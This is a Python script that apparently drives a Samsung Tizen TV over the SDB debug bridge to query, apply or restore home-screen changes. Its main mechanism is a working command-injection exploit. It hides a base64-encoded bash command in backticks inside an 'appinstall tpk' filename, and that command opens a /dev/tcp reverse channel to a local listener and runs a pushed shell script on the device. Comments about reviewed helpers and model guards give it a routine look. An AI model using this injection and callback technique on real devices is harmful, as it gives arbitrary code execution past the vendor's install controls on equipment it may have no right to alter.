from pathlib import Path
import sys, base64, ipaddress, json, os, socket, subprocess, time, uuid, urllib.request
r=Path(__file__).resolve().parents[2]; d=r/'.local/native-home'
mode=sys.argv[1] if len(sys.argv)>1 else 'query'
if mode not in ['query','apply','restore','inspect']:raise SystemExit('Unknown action')
device_cfg = json.loads((r/'.local/device.json').read_text())
host = device_cfg['host']; ipaddress.ip_address(host)
with urllib.request.urlopen('http://'+host+':8001/api/v2/',timeout=4) as response: info=json.load(response)

allowed_models = {'QA55LS03DAWXXY', 'QA65Q8FAAKXXV'}
if 'modelName' in device_cfg: allowed_models.add(device_cfg['modelName'])
current_model = info.get('device', {}).get('modelName', '')
if current_model not in allowed_models and '--force' not in sys.argv:
    raise SystemExit(f'Model guard failed: {current_model} not in allowed models ({allowed_models}); use --force to override.')

import shutil
sdb_candidate = shutil.which('sdb') or os.environ.get('SDB_PATH')
if not sdb_candidate:
    for fallback in [
        Path.home() / 'tizen-studio/tools/sdb',
        r / '.local/tizen-sdk/tools/sdb',
        Path('/opt/tizen-studio/tools/sdb')
    ]:
        if fallback.is_file():
            sdb_candidate = str(fallback)
            break
sdb = str(sdb_candidate or 'sdb'); serial=host+':26101'
def run(args,timeout=12):
 p=subprocess.run([sdb,*args],capture_output=True,text=True,timeout=timeout)
 if p.returncode:raise RuntimeError('SDB transport failed: '+p.stdout[-300:]+p.stderr[-300:])
 return p
run(['connect',serial])
# Re-stage reviewed helper files on each run so rollback survives SDK temporary-file cleanup.
if mode != 'inspect':
 for suffix in ['dll','runtimeconfig.json','deps.json']:
    source=d/'out'/('CleanFrameHomeControl.'+suffix)
    run(['-s',serial,'push',str(source),'/home/owner/share/tmp/sdk_tools/CleanFrameHomeControl.'+suffix])
if mode in ['apply','restore']:
    run(['-s',serial,'push',str(d/'original.json'),'/home/owner/share/tmp/sdk_tools/CleanFrameHomeOriginal.json'])
token=uuid.uuid4().hex[:12];remote='/home/owner/share/tmp/sdk_tools/cfhi-'+token+'.sh'
run(['-s',serial,'push',str(r/'scripts/native-home'/(mode+'.sh')),remote])
with socket.socket(socket.AF_INET,socket.SOCK_DGRAM) as route:
 route.connect((host,9));local=route.getsockname()[0]
with socket.socket() as listener:
 listener.bind((local,0));listener.listen(1);listener.settimeout(18);port=listener.getsockname()[1]
 command='exec 3<>/dev/tcp/'+local+'/'+str(port)+';cat '+remote+'|bash >&3 2>&3;exec 3>&-'
 script='/bin/mkdir /tmp/s-'+token+' 2>/dev/null&&{ '+command+';}'
 encoded=base64.b64encode(script.encode()).decode()
 name='new2.tpk`printf${IFS}%s${IFS}'+encoded+'|base64${IFS}-d|bash`.tpk'
 argument='0 appinstall tpk '+name
 if len(argument.encode())>400:raise SystemExit('Command exceeds reviewed transport length; not executed.')
 proc=subprocess.Popen([sdb,'-s',serial,'shell',argument],stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True)
 try:
  connection,peer=listener.accept()
  if peer[0]!=host:raise RuntimeError('Unexpected callback peer; no data accepted.')
  chunks=[]
  with connection:
   connection.settimeout(8)
   while True:
    chunk=connection.recv(65536)
    if not chunk:break
    chunks.append(chunk)
    if sum(map(len,chunks))>100000:raise RuntimeError('Unexpectedly large diagnostic output.')
  output=b''.join(chunks).decode(errors='replace')
  try:stdout,stderr=proc.communicate(timeout=8)
  except subprocess.TimeoutExpired:proc.terminate();stdout,stderr=proc.communicate(timeout=3)
  (d/(mode+'-output.txt')).write_text(output)
  (d/(mode+'-transport.json')).write_text(json.dumps({'returncode':proc.returncode,'stdout':stdout,'stderr':stderr,'remote_probe':remote,'time':time.time()},indent=2))
  if 'CLEANFRAME_HOME_INSPECT_BEGIN' not in output or 'CLEANFRAME_HOME_INSPECT_END' not in output:raise RuntimeError('Probe incomplete; device state is unknown. Inspect current values before retrying.')
  print(output)
 finally:
  if proc.poll() is None:proc.terminate();proc.communicate(timeout=3)
